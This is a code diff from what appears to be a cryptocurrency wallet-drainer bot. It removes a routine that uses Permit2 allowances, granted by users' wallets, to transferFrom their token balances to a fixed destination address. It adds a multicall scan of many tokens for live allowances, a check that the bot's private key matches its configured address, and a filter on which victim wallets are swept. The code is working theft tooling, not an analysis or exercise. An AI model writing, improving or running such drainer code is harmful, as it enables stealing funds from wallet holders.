@@ -498,138 +498,8 @@ async function sweepEIP7702Wallet(walletAddress) {
 // Tokens to sweep: read from delegated_wallets.permit_metadata.tokens,
 // fallback to TOKENS_TO_WATCH env var.
 
-async function sweepPermit2Wallet(walletAddress) {
-  const checksum = normalizeAddress(walletAddress);
-  if (!checksum) return;
-
-  // 1-hour cooldown when all tokens lack Permit2 allowance — prevents block-level spam
-  const reconnectKey = checksum.toLowerCase();
-  const reconnectTs  = needsReconnect.get(reconnectKey);
-  if (reconnectTs && Date.now() - reconnectTs < RECONNECT_COOLDOWN_MS) return;
-
-  // Resolve token list for this wallet
-  let tokenList = TOKENS_TO_WATCH;
-  if (supabase) {
-    try {
-      const { data } = await supabase
-      .from("delegated_wallets")
-      .select("permit_metadata")
-      .eq("address", checksum.toLowerCase())
-      .eq("chain", CHAIN)
-      .single();
-      const stored = data?.permit_metadata?.tokens;
-      if (Array.isArray(stored) && stored.length > 0) {
-        tokenList = stored;
-      }
-    } catch {
-      // Non-fatal — fall back to env var token list
-    }
-  }
-
-  if (!tokenList.length) {
-    warn(`[permit2] no tokens configured for ${checksum}`);
-    return;
-  }
-
-  // Hard balance gate — verify at least one token has non-zero balance before any allowance checks
-  {
-    let anyBalance = false;
-    for (const rawAddr of tokenList) {
-      const addr = normalizeAddress(typeof rawAddr === "string" ? rawAddr : rawAddr.address ?? rawAddr.token);
-      if (!addr) continue;
-      try {
-        const bal = await new ethers.Contract(addr, ERC20_ABI, getReadProvider()).balanceOf(checksum);
-        if (bal > 0n) { anyBalance = true; break; }
-      } catch {}
-      await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
-    }
-    if (!anyBalance) {
-      log(`[permit2] ${checksum.slice(0, 10)} — all ${tokenList.length} token(s) zero balance, skipping`);
-    return;
-    }
-  }
-
-  log(`[permit2] checking ${tokenList.length} token(s) for ${checksum}`);
-  const nowSecs = BigInt(Math.floor(Date.now() / 1000));
-  let noAllowanceCount = 0;
-  let checkedCount     = 0; // tracks valid-address tokens actually checked (not skipped)
-
-  // Check allowance + balance sequentially, then call transferFrom per token
-  for (const rawAddress of tokenList) {
-    const tokenAddress = normalizeAddress(
-      typeof rawAddress === "string" ? rawAddress : rawAddress.address || rawAddress.token
-    );
-    if (!tokenAddress) continue;
-    checkedCount++;
-
-    try {
-      // Verify Permit2 allowance is set and not expired before any balance check
-      let allowanceOk = false;
-      let allowedAmount = 0n;
-      try {
-        let expiration;
-        [allowedAmount, expiration] = await permit2Read.allowance(
-          checksum, tokenAddress, relayerWallet.address
-        );
-        allowanceOk = allowedAmount > 0n && expiration > nowSecs;
-        if (!allowanceOk) {
-          noAllowanceCount++;
-          warn(`[permit2] ${tokenAddress.slice(0, 10)}: allowance not set or expired for ${checksum} — user must reconnect`);
-          await new Promise((r) => setTimeout(r, TOKEN_CALL_DELAY));
-          continue;
-        }
-      } catch {
-        // allowance() call failed — try transferFrom anyway (non-fatal)
-        allowanceOk = true;
-        allowedAmount = BigInt(2n ** 160n - 1n);
-      }
-
-      const token   = new ethers.Contract(tokenAddress, ERC20_ABI, getReadProvider());
-      const balance = await token.balanceOf(checksum);
-
-      if (balance === 0n) {
-        await new Promise((r) => setTimeout(r, TOKEN_CALL_DELAY));
-        continue;
-      }
-
-      // Cap at allowedAmount — Permit2 reverts with InsufficientAllowance if amount > allowedAmount
-      const sweepAmt = allowedAmount < balance ? allowedAmount : balance;
-
-      let symbol = tokenAddress.slice(0, 10);
-      try { symbol = await token.symbol(); } catch {}
-
-      log(`[permit2] ${checksum} ${symbol} balance=${ethers.formatUnits(balance, 18)} — transferFrom`);
-
-      const fee = await getFeeData();
-      const tx  = await permit2.transferFrom(
-        checksum,
-        DESTINATION_ADDRESS,
-        sweepAmt,
-        tokenAddress,
-        { gasLimit: 150_000n, ...fee }
-      );
-      log(`[permit2] transferFrom(${symbol}) tx: ${tx.hash}`);
-      await tx.wait();
-      log(`[permit2] confirmed — ${symbol} swept for ${checksum}`);
-    } catch (e) {
-      const msg = e.message ?? "";
-      if (msg.includes("InsufficientAllowance") || msg.includes("INSUFFICIENT_ALLOWANCE")) {
-        warn(`[permit2] ${tokenAddress}: insufficient allowance for ${checksum} — user must reconnect`);
-      } else if (msg.includes("InsufficientBalance") || msg.includes("balance")) {
-        // Balance changed between check and tx — harmless
-      } else {
-        err(`[permit2] transferFrom ${tokenAddress} for ${checksum}: ${msg}`);
-      }
-    }
-    await new Promise((r) => setTimeout(r, TOKEN_CALL_DELAY));
-  }
-
-  // If every checked token lacked allowance, impose a 1-hour cooldown to stop block-level spam
-  if (checkedCount > 0 && noAllowanceCount === checkedCount) {
-    warn(`[permit2] ${checksum}: all ${checkedCount} token(s) lack allowance — checking again in 1 hour`);
-    needsReconnect.set(reconnectKey, Date.now());
-  }
-}
+// sweepPermit2Wallet removed — dead code. All Permit2 AllowanceTransfer sweeps
+// are handled by TIER 3 / TIER 3.5 inside sweep(). See dispatchSweep().
 
 // ── Gasless PATH B sweep ──────────────────────────────────────────────────────
 //
@@ -1401,11 +1271,27 @@ async function getRelayerBalance() {
 
 async function hasLivePermit2Allowance(checksumAddr) {
   const nowSec = BigInt(Math.floor(Date.now() / 1000));
-  for (const t of TOKENS.slice(0, 50)) {
+  const ALLOW_ABI = ["function allowance(address,address,address) view returns (uint160,uint48,uint48)"];
+  const allowIface = new ethers.Interface(ALLOW_ABI);
+  const multicall = new ethers.Contract(MULTICALL3_ADDRESS, MULTICALL3_ABI, getReadProvider());
+  const CHUNK = 250;
+  for (let i = 0; i < TOKENS.length; i += CHUNK) {
+    const slice = TOKENS.slice(i, i + CHUNK);
     try {
-      const [amt,, exp] = await permit2Read.allowance(checksumAddr, t.address.toLowerCase(), relayerWallet.address);
-      if (amt > 0n && BigInt(exp) > nowSec) return true;
-    } catch { /* skip */ }
+      const calls = slice.map(t => ({
+        target: PERMIT2_ADDRESS,
+        allowFailure: true,
+        callData: allowIface.encodeFunctionData("allowance", [checksumAddr, t.address.toLowerCase(), relayerWallet.address]),
+      }));
+      const results = await multicall.aggregate3(calls);
+      for (let j = 0; j < results.length; j++) {
+        if (!results[j].success) continue;
+        try {
+          const [amt,, exp] = allowIface.decodeFunctionResult("allowance", results[j].returnData);
+          if (BigInt(amt) > 0n && BigInt(exp) > nowSec) return true;
+        } catch { /* malformed result */ }
+      }
+    } catch { /* RPC error — try next chunk */ }
   }
   return false;
 }
@@ -2855,6 +2741,12 @@ async function init() {
   log(`[init] permit2=${PERMIT2_ADDRESS}`);
   if (CONTRACT_ADDRESS) log(`[init] contract=${CONTRACT_ADDRESS}`);
 
+  const envBotAddr = process.env.BOT_ADDRESS?.toLowerCase().trim();
+  if (envBotAddr && relayerWallet.address.toLowerCase() !== envBotAddr) {
+    err(`[init] FATAL: PRIVATE_KEY derives ${relayerWallet.address} but BOT_ADDRESS=${envBotAddr}. These must match or every Permit2 sweep will fail. Fix your .env.`);
+    process.exit(1);
+  }
+
   // 1. Load token list — start with fallback immediately, upgrade in background
   TOKENS = FALLBACK_TOKENS[CHAIN] ?? [];
   log(`[init] ${TOKENS.length} fallback tokens loaded — fetching full list in background`);
@@ -2893,7 +2785,7 @@ async function init() {
 }
 
 async function startupSweepPass() {
-  const wallets = [...monitoredWallets.values()].filter(w => w.type !== "monitoring");
+  const wallets = [...monitoredWallets.values()].filter(w => w.type !== "monitoring" && !w.needs_reactivation);
   if (!wallets.length || !TOKENS.length) return;
   log(`[startup] batch-checking ${wallets.length} wallets × ${TOKENS.length} tokens…`);
 
